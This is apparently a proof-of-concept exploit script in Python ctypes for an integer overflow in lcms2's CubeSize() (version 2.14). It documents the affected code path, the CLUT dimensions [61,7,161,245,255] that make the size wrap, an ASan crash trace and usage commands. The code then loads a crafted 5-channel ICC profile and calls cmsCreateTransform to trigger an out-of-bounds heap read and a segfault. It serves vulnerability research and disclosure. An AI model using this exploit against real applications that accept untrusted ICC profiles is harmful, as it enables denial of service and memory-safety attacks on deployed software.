"""
lcms2 CubeSize() integer overflow — Python (ctypes) POC
Affected: liblcms2-2.14 (Ubuntu 24.04 / Debian bookworm default package)

ATTACK SURFACE:
  Any Python application that:
  1. Loads an attacker-controlled ICC profile
  2. Calls cmsCreateTransform() with a 5+-channel pixel format

  This bypasses image-format validation used by CLI tools (tificc, jpgicc,
  ImageMagick convert) because ctypes calls cmsCreateTransform() directly with
  the correct 5-channel pixel type — exactly as a developer would write when
  building a spectral/CMYK5 color pipeline (e.g., a Flask image processor,
  a Pillow-based photo service, or a scikit-image color conversion tool).

WHAT HAPPENS:
  The overflow is in CubeSize() (cmsopt.c) which multiplies CLUT grid dimensions
  without overflow checking. For the 5CLR profile with dims [61,7,161,245,255]:
    Real product: 4,294,968,825 (> 2^32)
    Wrapped value: 1,529
  lcms2 allocates a CLUT table for 1,529 entries, then iterates over 4.3 billion —
  reading far past the heap buffer in Eval4Inputs/Eval5Inputs (cmsintrp.c:909).

CRASH PATH (confirmed with ASan):
  cmsCreateTransform (cmsxform.c:1332)
  -> cmsCreateExtendedTransform (cmsxform.c:1181)
  -> AllocEmptyTransform (cmsxform.c:913)
  -> _cmsOptimizePipeline (cmsopt.c:1957)
  -> OptimizeByResampling (cmsopt.c:741)
  -> cmsStageSampleCLut16bit (cmslut.c:792)  [iterates using wrapping CubeSize]
  -> _LUTevalFloat (cmslut.c:1359)
  -> EvaluateCLUTfloatIn16 (cmslut.c:454)
  -> Eval5Inputs (cmsintrp.c:1164)
  -> Eval4Inputs (cmsintrp.c:909)  *** SIGSEGV: READ of unmapped memory ***

CONFIRMED CRASH via:
  - Python ctypes (this file): exit code 139, SIGSEGV
  - Rust lcms2 crate 5.6.0 / Transform::new(): SIGSEGV, identical stack
  - C POC (poc_v2): SIGSEGV (baseline)

DOES NOT CRASH via:
  - PIL.ImageCms.buildTransform(): PIL has no 5-channel PIL mode, falls back to
    TYPE_GRAY_8 -> lcms2 rejects colorspace mismatch with NULL (no crash)
  - Node.js @kittl/little-cms: WASM-compiled lcms2 is sandboxed; also broken
    on Node 18 due to ESM import issues with extensionless imports

ENVIRONMENT:
  ubuntu@lcms2-poc, liblcms2-2.14-2build1 (Ubuntu 24.04)
  python3.12 / Pillow 10.2.0

USAGE:
  python3 python_poc.py
  LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libasan.so.8 \\
    ASAN_OPTIONS=abort_on_error=0:detect_leaks=0 \\
    python3 python_poc.py   # for ASan stack trace
"""

import ctypes
import sys
import os

ICC_PATH = os.environ.get("ICC_PATH", "/home/ubuntu/mal_5ch.icc")

# Load lcms2 shared library
try:
    lcms2 = ctypes.CDLL("liblcms2.so.2")
except OSError as e:
    print(f"ERROR: cannot load liblcms2.so.2: {e}")
    sys.exit(1)

# Bind cmsOpenProfileFromMem
lcms2.cmsOpenProfileFromMem.restype = ctypes.c_void_p
lcms2.cmsOpenProfileFromMem.argtypes = [ctypes.c_char_p, ctypes.c_uint32]

# Bind cmsCreate_sRGBProfile
lcms2.cmsCreate_sRGBProfile.restype = ctypes.c_void_p
lcms2.cmsCreate_sRGBProfile.argtypes = []

# Bind cmsCreateTransform
lcms2.cmsCreateTransform.restype = ctypes.c_void_p
lcms2.cmsCreateTransform.argtypes = [
    ctypes.c_void_p,   # hInput
    ctypes.c_uint32,   # InputFormat
    ctypes.c_void_p,   # hOutput
    ctypes.c_uint32,   # OutputFormat
    ctypes.c_uint32,   # nIntent
    ctypes.c_uint32,   # dwFlags
]

# Bind cleanup
lcms2.cmsCloseProfile.argtypes = [ctypes.c_void_p]
lcms2.cmsDeleteTransform.argtypes = [ctypes.c_void_p]

# Load malicious 5CLR profile
print(f"[*] Loading ICC profile: {ICC_PATH}")
with open(ICC_PATH, "rb") as f:
    icc_data = f.read()
print(f"[*] Profile size: {len(icc_data)} bytes")

hInput = lcms2.cmsOpenProfileFromMem(icc_data, len(icc_data))
if not hInput:
    print("ERROR: cmsOpenProfileFromMem returned NULL")
    sys.exit(1)
print(f"[*] 5CLR profile handle: {hInput:#x}")

hOutput = lcms2.cmsCreate_sRGBProfile()
if not hOutput:
    print("ERROR: cmsCreate_sRGBProfile returned NULL")
    sys.exit(1)
print(f"[*] sRGB profile handle: {hOutput:#x}")

# TYPE_CMYK5_8 = COLORSPACE_SH(PT_MCH5) | CHANNELS_SH(5) | BYTES_SH(1)
# PT_MCH5 = 19  (from lcms2.h)
# COLORSPACE_SH(s) = (s) << 16
# CHANNELS_SH(c)   = (c) << 3
# BYTES_SH(b)      = (b)
PT_MCH5     = 19
TYPE_CMYK5_8 = (PT_MCH5 << 16) | (5 << 3) | 1    # = 0x00130029 = 1245225
TYPE_RGB_8   = (4 << 16)       | (3 << 3) | 1    # = 0x00040019 = 262169

print(f"[*] TYPE_CMYK5_8 = {TYPE_CMYK5_8:#010x}")
print(f"[*] TYPE_RGB_8   = {TYPE_RGB_8:#010x}")
print(f"[*] Calling cmsCreateTransform() — expect SIGSEGV...")
sys.stdout.flush()

# THIS LINE CAUSES SIGSEGV — the overflow occurs inside lcms2 during
# CLUT optimization in cmsCreateTransform, before any pixel data is processed.
hTransform = lcms2.cmsCreateTransform(
    hInput, TYPE_CMYK5_8,
    hOutput, TYPE_RGB_8,
    0,   # INTENT_PERCEPTUAL
    0,   # no flags (default optimization triggers the overflow)
)

# If we reach here, the library did not crash (patched or different version)
print(f"[!] cmsCreateTransform returned: {hTransform}")
print("[!] Library did NOT crash — may be a patched version")

if hTransform:
    lcms2.cmsDeleteTransform(hTransform)
lcms2.cmsCloseProfile(hInput)
lcms2.cmsCloseProfile(hOutput)
